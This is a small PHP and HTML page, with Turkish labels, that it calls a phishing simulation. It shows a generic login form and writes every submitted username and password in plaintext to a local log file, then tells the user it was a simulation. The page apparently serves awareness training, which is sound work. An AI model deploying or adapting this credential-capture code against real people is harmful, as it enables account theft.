<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Girilen bilgileri kaydetmek için dosya
    $file = fopen("fake_log.txt", "a");
    fwrite($file, "Kullanıcı Adı: " . $username . "\n");
    fwrite($file, "Şifre: " . $password . "\n");
    fclose($file);

    echo "Bilgiler kaydedildi! Bu bir phishing simülasyonudur.";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Phishing Simülasyonu</title>
</head>
<body>
    <h2>Giriş Bilgilerinizi Girin:</h2>
    <form method="post">
        Kullanıcı Adı: <input type="text" name="username"><br>
        Şifre: <input type="password" name="password"><br>
        <input type="submit" value="Gönder">
    </form>
</body>
</html>